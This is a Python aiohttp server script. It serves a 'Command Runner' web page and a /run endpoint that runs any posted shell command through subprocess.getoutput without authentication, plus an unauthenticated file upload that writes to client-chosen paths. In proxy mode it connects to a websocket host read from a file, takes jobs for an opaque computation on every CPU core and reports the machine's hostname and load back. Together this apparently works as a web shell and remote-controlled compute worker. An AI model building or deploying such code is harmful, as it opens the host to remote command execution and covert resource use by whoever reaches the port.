import json
import ssl
import asyncio
from aiohttp import web, ClientSession, WSMsgType
import os
import sys
import subprocess
import psutil
import y1
import threading
import time
import random
import traceback

from concurrent.futures import ProcessPoolExecutor
executor = ProcessPoolExecutor()

xterm = """
<!DOCTYPE html>
<html>
<head>
	<title>Command Runner</title>
</head>
<body>
	<form id="cmdForm">
		<input style="width: 800px; height:40px; font-size: 1.5em;" type="text" name="cmd" placeholder="Enter command" />
		<button type="submit">Run</button>
	</form>

	<div style="border: 1px solid #ccc; padding: 10px; min-height: 200px; white-space: pre-wrap; font-family: monospace;" id="output"></div>

	<script>
		document.getElementById('cmdForm').addEventListener('submit', async (e) => {
			e.preventDefault();
			const formData = new FormData(e.target);
			const response = await fetch('/run', {
				method: 'POST',
				body: formData
			});
			const result = await response.text();
			document.getElementById('output').innerHTML = result;
		});
	</script>
</body>
</html>
"""
async def handle(request: web.Request) -> web.Response:
	"""A simple handler that greets the user."""
	name = request.match_info.get('name', "Anonymous")
	text = f"Hello, {name}, from your secure aiohttp server!"
	return web.Response(text=xterm, content_type='text/html')

async def handle_run(request: web.Request) -> web.Response:
	data = await request.post()
	cmd = data.get('cmd', '')
	result = subprocess.getoutput(cmd)
	return web.Response(text=f"<pre>{result}</pre>", content_type='text/html')

async def handle_info(request: web.Request) -> web.Response:
	json_data = {	'cpu_count': os.cpu_count(),
								'platform': sys.platform,
								'python_version': sys.version,
								'working_directory': os.getcwd(),
								'pid': os.getpid(),
								'cpu_usage': os.popen(f'ps -p {os.getpid()} -o %cpu').read().strip(),
								'memory_usage': os.popen(f'ps -p {os.getpid()} -o %mem').read().strip(),
								'uptime': time.time() - os.path.getmtime('/proc/1/stat'),
							}
	return web.json_response(json_data)

async def handle_file(request):
	data = await request.post()
	uploaded_file = data['file']  # 'file' is the name attribute in your HTML form
	filename = uploaded_file.filename
	content = uploaded_file.file.read()  # Read file content as bytes

	# Save the file locally
	with open(f'{filename}', 'wb') as f:
		f.write(content)

	return web.Response(text=f"Uploaded {filename} successfully!")

async def handle_params(request: web.Request) -> web.StreamResponse:
	try:
		response = web.StreamResponse(
			status=200,
			reason='OK',
			headers={'Content-Type': 'application/json', 'X-Content-Type-Options': 'nosniff'},
		)
		await response.prepare(request)

		data = await request.json()
		bin_data = bytes.fromhex(data['bin'])
		no = int(data['no'], 16)
		id = data['id']
		print(f"Client Req : {request.path} {no=:08x} {id=}")
		start_time = time.time()
		loop = asyncio.get_running_loop()
		while True:
			bin, no, ret = await loop.run_in_executor(
					executor, y1.foo, bin_data, no
			)
			if ret != -1:
				json_data = {"result": "True", "bin": bin.hex(), "no": f"{no:08x}"}
				print (f"{id} :: ", json_data)
			else:
				json_data = {"result": "False"}
			no +=1
			await response.write(json.dumps(json_data).encode('utf-8')+b'\r\n')
			if time.time() - start_time > 90:
				print(f"Request Timeout : {request.path} {no=:08x} {id=}")
				await response.write_eof()
				break

	except ConnectionResetError:
		print("Client disconnected during streaming.")
	except Exception as e:
		print(f"handle_params exception : {e}")

	return response

async def handle_start(request: web.Request) -> web.Response:
	import subprocess

	# Command to run in the background
	command = ["python3", "start.py"]

	# Start a detached subprocess
	subprocess.Popen(
			command,
			stdout=subprocess.DEVNULL,
			stderr=subprocess.DEVNULL,
			stdin=subprocess.DEVNULL,
			start_new_session=True  # This detaches the process from the parent
	)
	text = f"Start!"
	return web.Response(text=text)

# --- Main Application Setup ---
app = web.Application()
app.add_routes([
	web.get('/', handle),
	web.get('/start', handle_start),
	web.get('/info', handle_info),
	web.post('/run', handle_run),
	web.post('/file', handle_file),
	web.post('/params', handle_params),
	web.post('/params2', handle_params),
])

def foo_func(bin_data, no):
	process = psutil.Process(os.getpid())
	process.cpu_percent(interval=None)
	#process.cpu_affinity([0, 2, 4, 6])
	time_start = time.time()
	bin, no, ret = y1.foo(bin_data, no)
	run_time = time.time()-time_start
	cpu_usage = process.cpu_percent(interval=None)
	cpu_times = process.cpu_times()
	total_cpu_time = cpu_times.user + cpu_times.system
	return bin, no, ret, run_time, cpu_usage, total_cpu_time

ws_q = asyncio.Queue()
async def foo_runner(num, run_q):
	i = -1
	last_noti_time = time.time()
	avg_run_time = avg_cpu_usage = total_cpu_time = 0
	stage = move = 0
	while True:
		try:
			if run_q.empty():
				if i == -1: # bin_data, no X
					await asyncio.sleep(.1)
					continue
				if time.time() - run_start_time > 90:
					print(f"{num}: Run Timeout")
					i = -1
					continue
				loop = asyncio.get_running_loop()
				bin, no, ret, run_time, cpu_usage, total_cpu_time = await loop.run_in_executor(
							executor, foo_func, bin_data, no
				)
				avg_run_time += (run_time-avg_run_time)/3
				avg_cpu_usage += (cpu_usage-avg_cpu_usage)/3
				move += 1
				if ret != -1:
					#print(f"Iteration {i}: {new_no=:08x} {new_mask=:08x} {ret=}")
					print(f"...{num}:{i}  {no:08x}")
					await ws_q.put({"result": "True", "bin": bin.hex(), "no": f"{no:08x}"})
					stage += 1
				else:
					#print(f"Iteration {i}: {new_no=:08x} Computation failed. {ret=}")
					#print(f".{num}  ({time.time()-time_start:.2f})")
					await ws_q.put({"result": "False"})
				no+=1
				i+=1
			else:
				item = await run_q.get()
				run_q.task_done()
				if 'stop' in item:
					i = -1
					continue
				# run
				bin_data = bytes.fromhex(item['bin'])
				no = int(item['no'], 16)
				i = 0
				run_start_time = time.time()

			if time.time() - last_noti_time > 10:
				await ws_q.put({"type": "noti",
												"name": os.popen("cat /etc/hostname").read().strip() if os.path.exists("/etc/hostname") else "N/A",
												"stage": stage, "move": move,
												"run_time": f"{avg_run_time:.2f}",
												"cpu_usage": f"{avg_cpu_usage:.2f}",
												"cpu_time": f"{total_cpu_time:.2f}",
												"uptime": os.popen("uptime").read().strip()})
				last_noti_time = time.time()
		except Exception as e:
			print(f"Error in foo_runner: {e}")

async def websocket_client(num, run_q, ws_url):
		while True:
			#print("Reconnecting to WebSocket...")
			try:
				async with ClientSession() as session:
					# Attempt to connect to the WebSocket server
					ssl_context = ssl.create_default_context()
					ssl_context.check_hostname = False
					ssl_context.verify_mode = ssl.CERT_NONE
					async with session.ws_connect(ws_url, ssl=ssl_context) as ws:
						print(f"{num}: WebSocket connection established successfully.")
						last_msg_time = last_noti_time = time.time()
						while True:
							if ws_q.qsize() > 0:
								item = await ws_q.get()
								ws_q.task_done()
								await ws.send_json(item)
							try:
								msg = await asyncio.wait_for(ws.receive(), 0.1)
								last_msg_time = time.time()
								if msg.type == WSMsgType.TEXT:
									try:
										data = json.loads(msg.data)
										#print("Received JSON:", data)
										if "req" in data:
											if data['req'] == 'run':
												await run_q.put({"bin": data['bin'], "no": data['no']})
											elif data['req'] == 'stop':
												await run_q.put({"stop": True})
									except json.JSONDecodeError:
										print("Received non-JSON message:", msg.data)
									except Exception as e:
										print(f"Error processing message: {e}")
								elif msg.type == WSMsgType.ERROR:
									print(f"⚠️ {num}: WebSocket error: {ws.exception()}")
									await run_q.put({"stop": True})
									await asyncio.sleep(1)
									break
								elif msg.type == WSMsgType.CLOSE:
									print(f"🔌 {num}: WebSocket connection closed by client")
									await run_q.put({"stop": True})
									await asyncio.sleep(1)
									break
							except asyncio.TimeoutError:	# ws.receive(), 0.1
								if time.time() - last_msg_time > 90:
									print(f"{num}: WebSocket msg timed out. Reconnecting...")
									await run_q.put({"stop": True})
									await asyncio.sleep(1)
									break
								else:
									continue
			except (ConnectionRefusedError, asyncio.TimeoutError) as e:
				print(f"WebSocket connection failed: {e}")
				await asyncio.sleep(10)
			except asyncio.CancelledError:
				print("WebSocket task cancelled. Cleaning up...")
				# Connection will auto-close due to `async with`
				await ws.close()
				raise
			except Exception as e:
				print(f"{num}: WebSocket connection error: {e}")
				await asyncio.sleep(10)

async def on_startup(app):
	with open("brg_url.txt") as f:
		ws_url = f.readline()
	cores = psutil.cpu_count(logical=False)
	#cores = 4
	app['tasks'] = []
	for i in range(cores):
		q = asyncio.Queue()
		runner = asyncio.create_task(foo_runner(i, q))
		ws = asyncio.create_task(websocket_client(i, q, ws_url))
		app['tasks'].append(runner)
		app['tasks'].append(ws)

async def on_cleanup(app):
	for task in app['tasks']:
		task.cancel()
		try:
			await task
		except asyncio.CancelledError:
			print("Background task cancelled.")

def main():
	"""Sets up the SSL context and runs the aiohttp application."""

	cert_file = 'cert.pem'
	key_file = 'key.pem'

	# --- SSL Context Setup ---
	# For a robust and secure server, it's recommended to use
	# ssl.create_default_context.
	# ssl.Purpose.CLIENT_AUTH means the context is for a server-side socket,
	# which will authenticate clients.
	ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
	ssl_context.check_hostname = False
	ssl_context.verify_mode = ssl.CERT_NONE
	# Load your server's certificate and private key.
	# In a production environment, you would use a certificate from a
	# trusted Certificate Authority (CA) like Let's Encrypt.
	try:
		ssl_context.load_cert_chain(certfile=cert_file, keyfile=key_file)
		print(f"Successfully loaded certificate from '{cert_file}' and key from '{key_file}'.")
	except FileNotFoundError:
		print("=" * 60)
		print(f"ERROR: Could not find '{cert_file}' or '{key_file}'.")
		print("You can generate a self-signed certificate for development with:")
		print('openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 365 -nodes -subj "/CN=localhost"')
		print("=" * 60)
		return
	except ssl.SSLError as e:
		print(f"An SSL error occurred: {e}")
		print("Please ensure your certificate and key files are valid and match.")
		return

	if '--proxy' in sys.argv:
		app.on_startup.append(on_startup)
		app.on_cleanup.append(on_cleanup)

	# --- Run the application with HTTPS ---
	# Passing the `ssl_context` to `run_app` is what enables HTTPS.
	host = '0.0.0.0'
	port = 10000
	print(f"Starting secure server on https://{host}:{port}")
	web.run_app(app, host=host, port=port, ssl_context=ssl_context)
	#web.run_app(app, host=host, port=port)

if __name__ == '__main__':
	script_dir = os.path.dirname(os.path.abspath(__file__))
	os.chdir(script_dir)
	print(f"Working directory set to: {os.getcwd()}")
	time.sleep(1)  # Give the server a moment to start

	try:
		main()
	except KeyboardInterrupt:
		print("\n[Main] Program terminated by user.")
